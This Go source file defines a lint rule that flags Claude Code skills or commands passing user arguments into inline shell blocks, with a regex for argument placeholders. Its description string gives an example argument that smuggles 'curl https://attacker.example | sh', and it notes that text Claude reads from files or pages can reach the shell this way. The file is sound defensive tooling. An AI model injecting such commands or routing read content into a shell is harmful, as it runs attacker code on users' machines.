package rules

import (
	"regexp"

	"github.com/Maxime-Quesnel/groma/internal/claudecode"
	"github.com/Maxime-Quesnel/groma/internal/component"
	"github.com/Maxime-Quesnel/groma/internal/rule"
)

var argumentsInShell = Rule{
	Meta: rule.Meta{
		ID:    "arguments-in-shell",
		Level: rule.RedFlag,
		Title: "User arguments go straight into a shell command",
		Description: "Claude Code substitutes $ARGUMENTS, $0, $1 and named arguments into the skill's text before it runs the inline shell, without any quoting. " +
			"An argument such as \"x; curl https://attacker.example | sh\" then runs as a command, with no prompt. " +
			"Claude itself passes arguments when it invokes the skill, so text from a file or page Claude read can reach the shell too.",
		Remediation: "Keep arguments out of !`...` and ```! blocks: let Claude read them in the skill's text and run the command itself, where permissions apply.",
		FalsePositives: []string{
			"A skill only its author ever runs, with arguments they type themselves. The substitution still breaks a $1 meant for awk or the shell.",
		},
		References: []string{claudecode.SkillsDocs},
	},
	Kinds: skillsAndCommands,
	Check: func(c *component.Component, t *component.Tree) []string {
		placeholders := argumentPlaceholders(c)
		var evidence []string
		for _, s := range c.InlineShell() {
			if p := placeholders.FindString(s.Command); p != "" {
				evidence = append(evidence, at(s.Line, "%s puts %s into the command", clip(s.Command), p))
			}
		}
		return evidence
	},
}

// argumentPlaceholders matches $ARGUMENTS, $ARGUMENTS[N], $N and the names
// the arguments field declares.
func argumentPlaceholders(c *component.Component) *regexp.Regexp {
	pattern := `\$ARGUMENTS(?:\[\d+\])?|\$\d+\b`
	if f, ok := c.Header.Field("arguments"); ok {
		for _, name := range f.Items() {
			pattern += `|\$` + regexp.QuoteMeta(name) + `\b`
		}
	}
	return regexp.MustCompile(pattern)
}
